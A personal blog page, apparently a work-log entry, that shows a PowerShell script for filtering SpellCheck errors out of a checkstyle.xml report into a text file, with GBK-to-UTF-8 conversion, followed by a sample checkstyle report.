    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="ps1"><a href="#ps1" class="headerlink" title="ps1"></a>ps1</h3><figure class="highlight plaintext"><figcaption><span>go&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    $gbk = [System.Text.Encoding]::GetEncoding(&quot;GBK&quot;)</span><br><span class="line">    $utf8 = [System.Text.Encoding]::UTF8</span><br><span class="line"></span><br><span class="line">    $result = &#x27;spell-filter.txt&#x27;</span><br><span class="line">    $encoding = [System.Text.Encoding]::GetEncoding(&quot;GBK&quot;)</span><br><span class="line">    rm $result -ea SilentlyContinue</span><br><span class="line">    $xml = cat checkstyle.xml</span><br><span class="line">    $xml = [xml]$xml  # 类型转换</span><br><span class="line">    $xml.checkstyle.file|%&#123;$_.error&#125;|?&#123;$_.source -match &#x27;SpellCheck&#x27;&#125;|</span><br><span class="line">    %&#123;</span><br><span class="line">      $fileContent = cat $_.parentNode.name -total $_.line -ea SilentlyContinue # 文件有可能不存在，所以要【静音】</span><br><span class="line">      $word = (($_.message -replace &#x27;The Spelling of word &#x27;, &#x27;&#x27;) -replace &#x27;may be illegal. .*&#x27;, &#x27;&#x27;) # 错误的拼写内容</span><br><span class="line"></span><br><span class="line">      if ($fileContent -ne $Null)&#123;</span><br><span class="line">        $code = $gbk.GetBytes($fileContent[-1]) # 错误的代码行</span><br><span class="line">        $code = $utf8.GetString($code)</span><br><span class="line">        &#x27;文件: &#x27; + $_.parentNode.name + &#x27; ,行号：&#x27; + $_.line + &#x27; ,拼写错误：&#x27; +  $word + &#x27; ,代码：&#x27; + $code&gt;&gt; $result</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        &#x27;不存在的文件： &#x27; + $_.parentNode.name + &#x27; , &#x27; + $_.line + &#x27; , &#x27; +  $word </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<h3 id="checkstyle-xml"><a href="#checkstyle-xml" class="headerlink" title="checkstyle.xml"></a>checkstyle.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;checkstyle version=&quot;5.0&quot;&gt;</span><br><span class="line">&lt;file name=&quot;package_zh_CN.properties&quot;&gt;</span><br><span class="line">&lt;error line=&quot;114&quot; column=&quot;81&quot; severity=&quot;error&quot; message=&quot;The Spelling of word &amp;quot;pageing&amp;quot; may be illegal. The suggestion(s) include(s): [paging, ageing, panging, pugging, pegging]&quot; source=&quot;SpellCheck&quot;/&gt;</span><br><span class="line">&lt;error line=&quot;117&quot; column=&quot;84&quot; severity=&quot;error&quot; message=&quot;The Spelling of word &amp;quot;pageing&amp;quot; may be illegal. The suggestion(s) include(s): [paging, ageing, panging, pugging, pegging]&quot; source=&quot;SpellCheck&quot;/&gt;</span><br><span class="line">&lt;/file&gt;</span><br><span class="line">&lt;file name=&quot;addOrDel.js&quot;&gt;</span><br><span class="line">&lt;error line=&quot;1&quot; severity=&quot;info&quot; message=&quot;File length is 2,373 lines (max allowed is 2,000).&quot; source=&quot;com.puppycrawl.tools.checkstyle.checks.sizes.FileLengthCheck&quot;/&gt;</span><br><span class="line">&lt;/file&gt;</span><br><span class="line">&lt;file name=&quot;showDataDictDetail.jsp&quot;&gt;</span><br><span class="line">&lt;error line=&quot;10&quot; column=&quot;19&quot; severity=&quot;error&quot; message=&quot;The Spelling of word &amp;quot;stylesheet&amp;quot; may be illegal. The suggestion(s) include(s): [StyleSheet]&quot; source=&quot;SpellCheck&quot;/&gt;</span><br><span class="line">&lt;/file&gt;</span><br><span class="line">&lt;/checkstyle&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





<nav id="pagination">
  
  
  <div class="clearfix"></div>
</nav></div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="as_sitesearch" value="l1z2g9.github.io">
  </form>
</div>


  

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/tags/AIX/">AIX</a><small>29</small></li>
  
    <li><a href="/tags/MySQL/">MySQL</a><small>2</small></li>
  
    <li><a href="/tags/Oracle/">Oracle</a><small>14</small></li>
  
    <li><a href="/tags/Problem-Solve/">Problem Solve</a><small>8</small></li>
  
    <li><a href="/tags/Raspberry-Pi/">Raspberry Pi</a><small>12</small></li>
  
    <li><a href="/tags/%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%BF%97/">工作日志</a><small>68</small></li>
  
    <li><a href="/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/">日常记录</a><small>23</small></li>
  
  </ul>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2022 Forrest Wan
  
</div>
<div class="clearfix"></div></footer>
  
<script src="/js/jquery-3.4.1.min.js"></script>


<script src="/js/jquery.imagesloaded.min.js"></script>


<script src="/js/gallery.js"></script>





</body>
</html>
